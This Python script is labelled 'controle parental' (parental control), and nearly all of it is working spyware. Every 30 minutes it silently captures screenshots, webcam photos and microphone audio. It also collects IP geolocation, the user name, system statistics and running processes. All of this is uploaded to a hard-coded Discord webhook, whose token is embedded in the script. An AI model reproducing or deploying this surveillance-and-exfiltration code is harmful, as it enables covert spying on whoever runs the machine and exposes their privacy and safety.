#!/usr/bin/env python3
import subprocess,sys,os,time,json,platform,shutil,sqlite3
from datetime import datetime
from pathlib import Path
from urllib.request import Request,urlopen

# DEPENDENCIAS
for p in ["psutil","pillow","opencv-python","sounddevice","scipy","numpy"]:
    try:
        subprocess.check_call([sys.executable,"-m","pip","install","-q",p],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except:
        pass

import psutil

try:
    from PIL import ImageGrab
    TEM_PIL=True
except:
    TEM_PIL=False

try:
    import cv2
    TEM_CV2=True
except:
    TEM_CV2=False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wav
    TEM_AUDIO=True
except:
    TEM_AUDIO=False

# CONFIG
WEBHOOK="https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"
HOME=str(Path.home())
PASTA=os.path.join(HOME,"controle_parental")
os.makedirs(PASTA,exist_ok=True)

def ts():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def enviar_msg(titulo,texto):
    try:
        dados=json.dumps({"embeds":[{"title":titulo,"description":texto[:4000],"color":3447003}]}).encode()
        req=Request(WEBHOOK,data=dados)
        req.add_header("Content-Type","application/json")
        req.add_header("User-Agent","Mozilla/5.0")
        urlopen(req,timeout=30)
        print("[+] Mensagem enviada!")
    except Exception as e:
        print("[-] Erro: "+str(e))

def enviar_ficheiro(caminho,msg=""):
    try:
        if not os.path.exists(caminho):
            return
        with open(caminho,"rb") as f:
            dados=f.read()
        nome=os.path.basename(caminho)
        b="----Boundary"+str(int(time.time()))
        body=b""
        if msg:
            body+=("--"+b+"\r\n").encode()
            body+=b"Content-Disposition: form-data; name=\"content\"\r\n\r\n"
            body+=msg.encode()+b"\r\n"
        body+=("--"+b+"\r\n").encode()
        body+=("Content-Disposition: form-data; name=\"file\"; filename=\""+nome+"\"\r\n").encode()
        body+=b"Content-Type: application/octet-stream\r\n\r\n"
        body+=dados+b"\r\n"
        body+=("--"+b+"--\r\n").encode()
        req=Request(WEBHOOK,data=body)
        req.add_header("Content-Type","multipart/form-data; boundary="+b)
        req.add_header("User-Agent","Mozilla/5.0")
        urlopen(req,timeout=120)
        print("[+] Ficheiro enviado: "+nome)
    except Exception as e:
        print("[-] Erro ficheiro: "+str(e))

def get_local():
    try:
        r=urlopen(Request("http://ip-api.com/json/"),timeout=10)
        d=json.loads(r.read().decode())
        return d.get("query","?"),d.get("city","?"),d.get("country","?"),d.get("isp","?")
    except:
        return "?","?","?","?"

def get_sistema():
    try:
        mem=psutil.virtual_memory()
        disco=psutil.disk_usage("/")
        bat=psutil.sensors_battery()
        return {
            "so":platform.system()+" "+platform.release(),
            "user":os.environ.get("USER",os.environ.get("USERNAME","?")),
            "cpu":str(psutil.cpu_percent())+"%",
            "ram":str(mem.percent)+"%",
            "disco":str(disco.percent)+"%",
            "bat":str(bat.percent)+"%" if bat else "N/A"
        }
    except:
        return {}

def get_processos():
    try:
        lista=[]
        for p in psutil.process_iter(["name","memory_percent"]):
            try:
                info=p.info
                if info["memory_percent"] and info["memory_percent"]>0.1:
                    lista.append(info["name"]+" - "+str(round(info["memory_percent"],1))+"%")
            except:
                pass
        return lista[:30]
    except:
        return []

def screenshot():
    if not TEM_PIL:
        print("[-] Screenshot: sem PIL")
        return None
    try:
        arq=os.path.join(PASTA,"tela_"+ts()+".png")
        if platform.system()=="Windows":
            ImageGrab.grab().save(arq)
        else:
            os.system("scrot "+arq+" 2>/dev/null || gnome-screenshot -f "+arq+" 2>/dev/null")
        if os.path.exists(arq):
            print("[+] Screenshot OK")
            return arq
    except:
        pass
    return None

def camera():
    if not TEM_CV2:
        print("[-] Camera: sem OpenCV")
        return None
    try:
        arq=os.path.join(PASTA,"cam_"+ts()+".jpg")
        cap=cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[-] Camera nao encontrada")
            return None
        time.sleep(2)
        ret,frame=cap.read()
        cap.release()
        if ret:
            cv2.imwrite(arq,frame)
            print("[+] Camera OK")
            return arq
    except:
        pass
    return None

def audio(seg=10):
    if not TEM_AUDIO:
        print("[-] Audio: sem dependencias")
        return None
    try:
        arq=os.path.join(PASTA,"audio_"+ts()+".wav")
        print("[*] Gravando "+str(seg)+"s...")
        rec=sd.rec(int(seg*44100),samplerate=44100,channels=1,dtype="int16")
        sd.wait()
        wav.write(arq,44100,rec)
        print("[+] Audio OK")
        return arq
    except:
        pass
    return None

def executar():
    print("\n"+"="*50)
    print("  MONITORAMENTO - "+ts())
    print("="*50+"\n")
    
    ip,cidade,pais,isp=get_local()
    sis=get_sistema()
    procs=get_processos()
    
    tela=screenshot()
    cam=camera()
    aud=audio(10)
    
    # Criar mensagem
    msg="**LOCALIZACAO**\n"
    msg+="IP: "+ip+"\n"
    msg+="Local: "+cidade+", "+pais+"\n"
    msg+="ISP: "+isp+"\n\n"
    msg+="**SISTEMA**\n"
    msg+="SO: "+sis.get("so","?")+"\n"
    msg+="User: "+sis.get("user","?")+"\n"
    msg+="CPU: "+sis.get("cpu","?")+"\n"
    msg+="RAM: "+sis.get("ram","?")+"\n"
    msg+="Disco: "+sis.get("disco","?")+"\n"
    msg+="Bateria: "+sis.get("bat","?")+"\n\n"
    msg+="**PROCESSOS:** "+str(len(procs))
    
    enviar_msg("Monitor - "+datetime.now().strftime("%d/%m %H:%M"),msg)
    time.sleep(1)
    
    if cam:
        enviar_ficheiro(cam,"CAMERA")
        time.sleep(1)
    if tela:
        enviar_ficheiro(tela,"SCREENSHOT")
        time.sleep(1)
    if aud:
        enviar_ficheiro(aud,"AUDIO")
    
    print("\n[OK] Concluido!\n")

if __name__=="__main__":
    print("\n=== CONTROLE PARENTAL ===\n")
    executar()
    print("[*] Proximo em 30 min (Ctrl+C sair)")
    while True:
        time.sleep(1800)
        executar()
